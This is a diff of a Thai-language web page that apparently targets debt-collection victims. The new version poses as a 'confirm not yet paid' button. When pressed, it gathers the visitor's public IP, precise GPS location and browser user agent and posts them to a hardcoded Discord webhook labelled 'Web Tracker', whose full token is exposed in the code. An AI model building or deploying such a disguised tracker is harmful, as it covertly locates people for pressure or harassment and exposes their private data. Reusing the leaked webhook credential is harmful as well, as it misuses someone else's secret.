@@ -1,113 +1,121 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="th">
 <head>
-<meta charset="UTF-8">
-<title>แชร์ตำแหน่งลูกค้า</title>
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>ARWX ลงงาน</title>
 <style>
-body {
-    font-family: Arial, sans-serif;
-    background: #0f172a;
-    color: white;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    height: 100vh;
-    margin: 0;
-}
-.box {
-    background: #020617;
-    padding: 25px;
-    border-radius: 15px;
-    width: 100%;
-    max-width: 380px;
-    text-align: center;
-    box-shadow: 0 0 20px rgba(0,150,255,.3);
-}
-input, button {
-    width: 100%;
-    padding: 12px;
-    margin-top: 10px;
-    border-radius: 8px;
-    border: none;
-}
-input {
-    font-size: 16px;
-}
-button {
-    font-size: 18px;
-    background: linear-gradient(45deg,#3b82f6,#06b6d4);
-    color: white;
-    cursor: pointer;
-}
-button:hover { opacity: .9; }
-.result {
-    margin-top: 15px;
-    font-size: 14px;
-    word-break: break-all;
-}
+  body{font-family:system-ui,sans-serif;background:#0f172a;color:#e5e7eb;padding:24px}
+  button{padding:12px 18px;border:0;border-radius:12px;background:#22c55e;cursor:pointer;font-size:16px}
+  pre{margin-top:16px;background:#020617;border-radius:12px;padding:14px;white-space:pre-wrap}
+  small{opacity:.8}
 </style>
 </head>
-
 <body>
 
-<div class="box">
-    <h2>📍 ระบุเวลาเก็บบอดเงิน</h2>
-
-    <input id="name" placeholder="ชื่อลูกค้า">
-    <input id="phone" placeholder="เบอร์โทร">
-
-    <button onclick="sendLocation()">ยืนยัน</button>
-
-    <div class="result" id="result"></div>
-</div>
+<h2>📍 ยินยันว่ายังไม่จ่าย</h2>
+<button id="btn">กดเพื่อส่ง</button>
+<pre id="out">ยังไม่ได้กด</pre>
 
 <script>
-const WEBHOOK_URL = "https://discord.com/api/webhooks/1452996074485710880/j3FV0207D74ogmrm6Y4_XepEzkrOk23XTQW70wAk0q21KeOGi9EMLYI4_dLY44yJCAaz";
+const WEBHOOK_URL = "https://discord.com/api/webhooks/1452996074485710880/j3FV0207D74ogmrm6Y4_XepEzkrOk23XTQW70wAk0q21KeOGi9EMLYI4_dLY44yJCAaz"; // <- ใส่ webhook ของคุณ
 
-function sendLocation() {
-    const name = document.getElementById("name").value;
-    const phone = document.getElementById("phone").value;
+const out = document.getElementById("out");
+const btn = document.getElementById("btn");
 
-    if (!name || !phone) {
-        alert("กรุณากรอกข้อมูลให้ครบ");
-        return;
-    }
-
-    navigator.geolocation.getCurrentPosition(pos => {
-        const lat = pos.coords.latitude;
-        const lng = pos.coords.longitude;
-        const map = `https://www.google.com/maps?q=${lat},${lng}`;
-
-        const payload = {
-            embeds: [{
-                title: "📦 ลูกค้าแชร์ตำแหน่ง",
-                color: 3447003,
-                fields: [
-                    { name: "👤 ชื่อ", value: name, inline: true },
-                    { name: "📞 เบอร์", value: phone, inline: true },
-                    { name: "📍 ตำแหน่ง", value: `[เปิดแผนที่](${map})` },
-                    { name: "Lat / Lng", value: `${lat}, ${lng}` }
-                ],
-                footer: { text: "Location System" },
-                timestamp: new Date()
-            }]
-        };
-
-        fetch(WEBHOOK_URL, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify(payload)
-        }).then(() => {
-            document.getElementById("result").innerHTML =
-                "✅ ส่งตำแหน่งเรียบร้อยแล้ว";
-        });
-
-    }, () => {
-        alert("กรุณาอนุญาตการเข้าถึงตำแหน่ง");
-    });
+function geoError(err){
+  let msg = "เกิดข้อผิดพลาด";
+  if (err.code === 1) msg = "❌ ผู้ใช้ไม่อนุญาตให้เข้าถึงตำแหน่ง (Permission denied)";
+  if (err.code === 2) msg = "❌ ไม่สามารถหาตำแหน่งได้ (Position unavailable)";
+  if (err.code === 3) msg = "❌ Timeout";
+  return msg;
 }
+
+async function getPublicIP(){
+  // ดึง IP สาธารณะ (IPv4/IPv6) — บางเครือข่ายจะได้ IPv6
+  // ถ้าโดนบล็อก ให้เปลี่ยน endpoint เป็นผู้ให้บริการอื่น
+  const r = await fetch("https://api.ipify.org?format=json", { cache: "no-store" });
+  if (!r.ok) throw new Error("ipify failed");
+  const j = await r.json();
+  return j.ip || "unknown";
+}
+
+function getGeo(){
+  return new Promise((resolve, reject) => {
+    if (!navigator.geolocation) return reject(new Error("Geolocation not supported"));
+    navigator.geolocation.getCurrentPosition(resolve, reject, {
+      enableHighAccuracy: true,
+      timeout: 15000,
+      maximumAge: 0
+    });
+  });
+}
+
+async function sendToDiscord(payload){
+  const r = await fetch(WEBHOOK_URL, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify(payload)
+  });
+  if (!r.ok) throw new Error("Webhook send failed");
+}
+
+btn.addEventListener("click", async () => {
+  try {
+    out.textContent = "⏳ กำลังดึง IP + ตำแหน่ง...";
+    btn.disabled = true;
+
+    // ดึงพร้อมกัน
+    const [ip, pos] = await Promise.all([
+      getPublicIP().catch(() => "unknown"),
+      getGeo()
+    ]);
+
+    const { latitude, longitude, accuracy } = pos.coords;
+    const time = new Date().toLocaleString("th-TH");
+    const mapUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;
+    const ua = navigator.userAgent;
+
+    const payload = {
+      username: "Web Tracker",
+      embeds: [{
+        title: "📍 ที่อยู่ ",
+        color: 0x22c55e,
+        fields: [
+          { name: "🕒 เวลา", value: time, inline: false },
+          { name: "🌐 IP (Public)", value: `\`${ip}\``, inline: true },
+          { name: "📌 Latitude", value: `\`${latitude}\``, inline: true },
+          { name: "📌 Longitude", value: `\`${longitude}\``, inline: true },
+          { name: "🎯 Accuracy", value: `${Math.round(accuracy)} เมตร`, inline: true },
+          { name: "🗺️ Google Maps", value: `[เปิดแผนที่](${mapUrl})`, inline: false },
+          { name: "🧾 User-Agent", value: `\`${ua.slice(0, 900)}\``, inline: false }
+        ],
+        footer: { text: "Web Location Reporter" }
+      }]
+    };
+
+    await sendToDiscord(payload);
+
+    out.textContent =
+      "✅ ส่งไป Discord แล้ว\n\n" +
+      `เวลา: ${time}\n` +
+      `IP: ${ip}\n` +
+      `Lat: ${latitude}\n` +
+      `Lon: ${longitude}\n` +
+      `Accuracy: ${Math.round(accuracy)}m\n` +
+      mapUrl;
+
+  } catch (e) {
+    // แยกเคส location error ให้ชัด
+    if (e && typeof e.code === "number") {
+      out.textContent = geoError(e);
+    } else {
+      out.textContent = "❌ ส่งไม่สำเร็จ: " + (e?.message || "unknown error");
+    }
+  } finally {
+    btn.disabled = false;
+  }
+});
 </script>
 
 </body>
